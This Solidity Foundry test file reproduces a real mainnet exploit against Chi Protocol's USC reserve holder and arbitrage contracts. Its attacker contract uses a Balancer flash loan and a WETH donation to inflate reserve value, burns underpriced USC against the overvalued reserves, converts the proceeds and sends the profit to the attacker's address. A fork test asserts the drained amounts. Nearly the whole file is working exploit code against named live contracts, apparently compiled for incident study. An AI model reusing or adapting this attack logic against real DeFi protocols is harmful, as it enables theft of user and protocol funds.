// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$8.5K
// Attacker : 0xF7105F68085294B6A45DD7231A6987b070E1AbaF
// Vulnerable Reserve Holder : 0xc36303ef9c780292755B5a9593Bfa8c1a7817E2a
// Vulnerable Arbitrage Contract : 0x594f4983Df88c3d84caA6eb30C18fBA1986ED6f1
// Attack Tx : 0x4a665f8eeada74552bd2dc466e5549731951f2f6180bbe865fa1d7b4be8ae96f
// Analysis : https://anomly.rs/usc-reserveholder-burn-exploit
//
// @Analysis
// A flash-loaned WETH deposit inflated the reserve value without increasing USC supply. The
// attacker bought underpriced USC and burned it against the temporarily overvalued reserves.

interface IERC20Like {
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function transfer(
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IWETH is IERC20Like {
    function deposit() external payable;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint256 amountOut);
}

interface ICurveStEthPool {
    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 minDy
    ) external payable;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IReserveHolderV2 {
    function deposit(
        address reserveAsset,
        uint256 amount
    ) external;
    function getReserveValue() external view returns (uint256);
}

interface IArbitrageV5 {
    function burn(
        uint256 amount,
        address reserveToReceive
    ) external returns (uint256);
    function _getReservesData()
        external
        view
        returns (bool isExcessOfReserves, uint256 reserveDiff, uint256 reserveValue);
}

interface IPriceFeedAggregator {
    function peek(
        address base
    ) external view returns (uint256 price);
}

interface IFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external;
}

contract USCReserveHolderBurnAttacker is IFlashLoanRecipient {
    address internal constant ATTACKER_EOA = 0xF7105F68085294B6A45DD7231A6987b070E1AbaF;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WEETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address internal constant USC = 0x38547D918b9645F2D94336B6b61AEB08053E142c;
    address internal constant ARBITRAGE = 0x594f4983Df88c3d84caA6eb30C18fBA1986ED6f1;
    address internal constant RESERVE_HOLDER = 0xc36303ef9c780292755B5a9593Bfa8c1a7817E2a;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant CURVE_STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    uint256 internal constant FLASH_LOAN_AMOUNT = 5 ether;
    uint256 internal constant USC_BUY_WETH_IN = 157_604_714_219_153_793;
    uint256 internal constant WETH_DONATION = 3_897_605_867_987_925_792;
    uint256 internal constant BURN_FOR_WEETH = 3_425_435_770_862_587_762_802;
    uint256 internal constant BURN_FOR_STETH = 5_165_076_296_008_024_072_188;
    uint256 internal constant BURN_FOR_WETH = 7_097_166_742_303_994_501_122;

    uint256 public reserveValueBefore;
    uint256 public reserveValueAfterDonation;
    uint256 public reserveValueAfterBurns;
    uint256 public uscBought;
    uint256 public weEthRedeemed;
    uint256 public stEthRedeemed;
    uint256 public wethRedeemed;
    uint256 public stEthToWethOut;
    uint256 public weEthToWethOut;
    uint256 public leftoverUscToWethOut;
    uint256 public profitWeth;

    receive() external payable {}

    function execute() external {
        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = IERC20Like(WETH);

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_AMOUNT;

        IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        IERC20Like[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not vault");
        require(amounts[0] == FLASH_LOAN_AMOUNT, "bad loan");
        require(feeAmounts[0] == 0, "unexpected fee");

        reserveValueBefore = IReserveHolderV2(RESERVE_HOLDER).getReserveValue();

        _swapV2(WETH, USC, USC_BUY_WETH_IN);
        uscBought = IERC20Like(USC).balanceOf(address(this));

        IERC20Like(WETH).approve(RESERVE_HOLDER, WETH_DONATION);
        IReserveHolderV2(RESERVE_HOLDER).deposit(WETH, WETH_DONATION);
        reserveValueAfterDonation = IReserveHolderV2(RESERVE_HOLDER).getReserveValue();

        IERC20Like(USC).approve(ARBITRAGE, type(uint256).max);
        weEthRedeemed = IArbitrageV5(ARBITRAGE).burn(BURN_FOR_WEETH, WEETH);
        stEthRedeemed = IArbitrageV5(ARBITRAGE).burn(BURN_FOR_STETH, STETH);
        wethRedeemed = IArbitrageV5(ARBITRAGE).burn(BURN_FOR_WETH, WETH);
        reserveValueAfterBurns = IReserveHolderV2(RESERVE_HOLDER).getReserveValue();

        uint256 stEthBalance = IERC20Like(STETH).balanceOf(address(this));
        IERC20Like(STETH).approve(CURVE_STETH_POOL, stEthBalance);
        uint256 ethBefore = address(this).balance;
        ICurveStEthPool(CURVE_STETH_POOL).exchange(1, 0, stEthBalance, 0);
        uint256 ethReceived = address(this).balance - ethBefore;
        IWETH(WETH).deposit{value: ethReceived}();
        stEthToWethOut = ethReceived;

        uint256 weEthBalance = IERC20Like(WEETH).balanceOf(address(this));
        IERC20Like(WEETH).approve(UNISWAP_V3_ROUTER, weEthBalance);
        weEthToWethOut = IUniswapV3Router(UNISWAP_V3_ROUTER)
            .exactInputSingle(
                IUniswapV3Router.ExactInputSingleParams({
                    tokenIn: WEETH,
                    tokenOut: WETH,
                    fee: 100,
                    recipient: address(this),
                    deadline: block.timestamp,
                    amountIn: weEthBalance,
                    amountOutMinimum: 0,
                    sqrtPriceLimitX96: 0
                })
            );

        uint256 uscLeft = IERC20Like(USC).balanceOf(address(this));
        leftoverUscToWethOut = _swapV2(USC, WETH, uscLeft);

        IERC20Like(WETH).transfer(BALANCER_VAULT, FLASH_LOAN_AMOUNT);
        profitWeth = IERC20Like(WETH).balanceOf(address(this));
        IERC20Like(WETH).transfer(ATTACKER_EOA, profitWeth);
    }

    function _swapV2(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (uint256 amountOut) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;

        IERC20Like(tokenIn).approve(UNISWAP_V2_ROUTER, amountIn);
        uint256[] memory amounts = IUniswapV2Router(UNISWAP_V2_ROUTER)
            .swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
        amountOut = amounts[1];
    }
}

contract ChiProtocolExp is Test {
    address internal constant ATTACKER_EOA = 0xF7105F68085294B6A45DD7231A6987b070E1AbaF;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WEETH = 0xCd5fE23C85820F7B72D0926FC9b05b43E359b7ee;
    address internal constant PRICE_FEED = 0xb3a36232ECc1da6C8D0d3f417E00406566933bD0;
    address internal constant RESERVE_HOLDER = 0xc36303ef9c780292755B5a9593Bfa8c1a7817E2a;
    address internal constant ARBITRAGE = 0x594f4983Df88c3d84caA6eb30C18fBA1986ED6f1;
    address internal constant WEETH_ADAPTER = 0x7f6dA7071d3524C61c2c87c4e631E52cbC8af5b6;
    address internal constant STETH_ADAPTER = 0x18601d46c38362cDA8CA0571BbBCD9a34bC2BD65;
    uint256 internal constant FOCAL_BLOCK = 25_520_523;

    function setUp() public {
        // Foundry forks at the post-state of a block number, so the exploit baseline
        // immediately before focal tx 0x4a665f... is block FOCAL_BLOCK - 1.
        vm.createSelectFork("mainnet", FOCAL_BLOCK - 1);
    }

    function testBurnRedeemsTemporarilyInflatedReserves() public {
        uint256 attackerWethBefore = IERC20Like(WETH).balanceOf(ATTACKER_EOA);
        uint256 reserveWethBefore = IERC20Like(WETH).balanceOf(RESERVE_HOLDER);
        uint256 weEthAdapterBefore = IERC20Like(WEETH).balanceOf(WEETH_ADAPTER);
        uint256 stEthAdapterBefore = IERC20Like(STETH).balanceOf(STETH_ADAPTER);

        (bool excessBefore, uint256 diffBefore, uint256 reserveValueBefore) = IArbitrageV5(ARBITRAGE)._getReservesData();

        emit log_named_uint("WETH oracle price", IPriceFeedAggregator(PRICE_FEED).peek(WETH));
        emit log_named_uint("reserve value before", reserveValueBefore);
        emit log_named_uint("reserve diff before", diffBefore);
        emit log_named_uint("reserve WETH before", reserveWethBefore);
        emit log_named_uint("weETH adapter before", weEthAdapterBefore);
        emit log_named_uint("stETH adapter before", stEthAdapterBefore);
        emit log_named_uint("is excess before", excessBefore ? 1 : 0);

        USCReserveHolderBurnAttacker attack = new USCReserveHolderBurnAttacker();
        attack.execute();

        uint256 attackerWethAfter = IERC20Like(WETH).balanceOf(ATTACKER_EOA);
        uint256 reserveWethAfter = IERC20Like(WETH).balanceOf(RESERVE_HOLDER);
        uint256 weEthAdapterAfter = IERC20Like(WEETH).balanceOf(WEETH_ADAPTER);
        uint256 stEthAdapterAfter = IERC20Like(STETH).balanceOf(STETH_ADAPTER);

        (bool excessAfter, uint256 diffAfter, uint256 reserveValueAfter) = IArbitrageV5(ARBITRAGE)._getReservesData();

        emit log_named_uint("USC bought", attack.uscBought());
        emit log_named_uint("reserve value after WETH donation", attack.reserveValueAfterDonation());
        emit log_named_uint("weETH redeemed", attack.weEthRedeemed());
        emit log_named_uint("stETH redeemed", attack.stEthRedeemed());
        emit log_named_uint("WETH redeemed", attack.wethRedeemed());
        emit log_named_uint("stETH converted to WETH", attack.stEthToWethOut());
        emit log_named_uint("weETH converted to WETH", attack.weEthToWethOut());
        emit log_named_uint("leftover USC converted to WETH", attack.leftoverUscToWethOut());
        emit log_named_uint("profit WETH", attack.profitWeth());
        emit log_named_uint("reserve value after burns", reserveValueAfter);
        emit log_named_uint("reserve diff after", diffAfter);
        emit log_named_uint("is excess after", excessAfter ? 1 : 0);
        emit log_named_uint("attacker WETH delta", attackerWethAfter - attackerWethBefore);
        emit log_named_uint("reserve WETH after", reserveWethAfter);
        emit log_named_uint("weETH adapter after", weEthAdapterAfter);
        emit log_named_uint("stETH adapter after", stEthAdapterAfter);

        assertGt(attack.reserveValueAfterDonation(), reserveValueBefore + 700_000_000_000);
        assertApproxEqAbs(attack.weEthRedeemed(), 1_712_100_778_539_935_954, 1);
        assertApproxEqAbs(attack.stEthRedeemed(), 2_820_261_435_472_125_253, 1);
        assertApproxEqAbs(attack.wethRedeemed(), 3_897_608_977_480_435_882, 1);
        assertApproxEqAbs(attackerWethAfter - attackerWethBefore, 4_663_280_483_035_439_508, 5e14);
        assertLt(reserveWethAfter, reserveWethBefore);
        assertApproxEqAbs(weEthAdapterBefore - weEthAdapterAfter, 1_712_100_778_539_935_954, 1);
        assertApproxEqAbs(stEthAdapterBefore - stEthAdapterAfter, 2_820_261_435_472_125_252, 1);
        assertLt(reserveValueAfter, reserveValueBefore / 1000);
        assertGt(diffAfter, reserveValueAfter);
    }
}
